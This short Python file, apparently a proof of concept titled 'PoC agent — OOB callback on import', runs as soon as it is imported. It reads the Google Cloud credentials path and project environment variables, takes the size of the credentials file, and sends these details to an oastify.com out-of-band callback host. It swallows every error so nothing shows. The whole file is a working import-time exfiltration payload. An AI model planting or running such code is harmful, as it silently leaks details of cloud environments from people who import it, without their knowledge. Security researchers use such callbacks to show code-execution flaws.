"""PoC agent — OOB callback on import."""
import os
import urllib.request

OOB = "m8vf34nf57o97knh8pm63mhnpev4j4me4egtrx9m.oastify.com"

_creds = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
_proj  = os.environ.get("GCLOUD_PROJECT", os.environ.get("CLOUDSDK_CORE_PROJECT", ""))
_fsize = 0
if _creds:
    try:
        _fsize = os.path.getsize(_creds)
    except Exception:
        pass

try:
    _url = f"http://{OOB}/import?gcpset={'1' if _creds else '0'}&fsize={_fsize}&proj={_proj}"
    urllib.request.urlopen(_url, timeout=5)
except Exception:
    pass
